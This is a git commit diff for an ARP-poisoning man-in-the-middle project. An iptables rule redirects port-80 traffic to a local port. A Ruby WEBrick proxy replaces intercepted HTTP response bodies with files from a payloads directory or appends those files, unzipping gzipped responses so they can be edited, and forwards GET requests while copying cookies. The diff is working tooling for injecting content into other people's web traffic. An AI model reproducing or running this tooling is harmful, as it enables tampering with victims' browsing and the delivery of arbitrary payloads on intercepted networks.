2d4119c06016b04e2361164a15242badd870bf7f
Carter Hay <clccmh@gmail.com>
2016-11-14 00:03:10 -0600

    working with arp poisoning, need to clean up everying

--- bin/ip_tables_forward.sh
+++ bin/ip_tables_forward.sh
@@ -1,4 +1,3 @@
 #!/bin/bash
 
-iptables -A FORWARD -p tcp --dport 80 -j REJECT
-#iptables -t nat -A PREROUTING --dport 80 -p tcp --to-destination localhost:8000
+sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to 8000
--- lib/http_proxy.rb
+++ lib/http_proxy.rb
@@ -2,6 +2,7 @@
 #
 # Copyright 2016 Carter Hay
 
+require 'net/http'
 require 'webrick'
 require 'webrick/httpproxy'
 require 'zlib'
@@ -15,12 +16,6 @@ def unzip(body)
 end
 
 handler = proc do |req, res|
-  # Unzip to allow editing response body
-  if res['content-encoding'] == 'gzip'
-    res.body = unzip(res.body)
-    res['content-encoding'] = ''
-  end
-
   puts req.request_line
   unless res.body.nil?
     unless res['content-type'].nil?
@@ -30,6 +25,11 @@ handler = proc do |req, res|
             if conf['type'] == 'replacement'
               res.body = File.read("../payloads/#{conf['file']}")
             else
+              # Unzip to allow editing response body
+              if res['content-encoding'] == 'gzip'
+                res.body = unzip(res.body)
+                res['content-encoding'] = ''
+              end
               res.body << File.read("../payloads/#{conf['file']}")
             end
             res['content-length'] = res.body.bytesize
@@ -40,12 +40,60 @@ handler = proc do |req, res|
   end
 end
 
-
 proxy = WEBrick::HTTPProxyServer.new(
   Port: ARGV[0], 
   ProxyContentHandler: handler, 
   AccessLog: []
 )
+
+
+HopByHop = %w( connection keep-alive proxy-authenticate upgrade
+      proxy-authorization te trailers transfer-encoding )
+ShouldNotTransfer = %w( set-cookie proxy-connection )
+
+def split_field(f) f ? f.split(/,\s+/).collect{|i| i.downcase } : [] end
+
+def choose_header(src, dst)
+  connections = split_field(src['connection'])
+  src.each{|key, value|
+    key = key.downcase
+      if HopByHop.member?(key)          || # RFC2616: 13.5.1
+        connections.member?(key)       || # RFC2616: 14.10
+          ShouldNotTransfer.member?(key)    # pragmatics
+          next
+          end
+          dst[key] = value
+  }
+end
+
+
+def set_cookie(src, dst)
+  if str = src['set-cookie']
+  cookies = []
+  str.split(/,\s*/).each{|token|
+    if /^[^=]+;/o =~ token
+      cookies[-1] << ", " << token
+        elsif /=/o =~ token
+        cookies << token
+    else
+      cookies[-1] << ", " << token
+        end
+  }
+dst.cookies.replace(cookies)
+  end
+  end
+
+proxy.mount_proc '/' do |req, res|
+  if req.request_method == 'GET'
+    http = Net::HTTP.new req.host, 80, 'localhost', 8000
+    new_res = http.get URI(req.request_uri)
+  end 
+  res.status = new_res.code.to_i
+  choose_header new_res, res
+  set_cookie new_res, res
+  res.body = new_res.body
+  res['content-length'] = res.body.bytesize
+end
 
 proxy.start
 
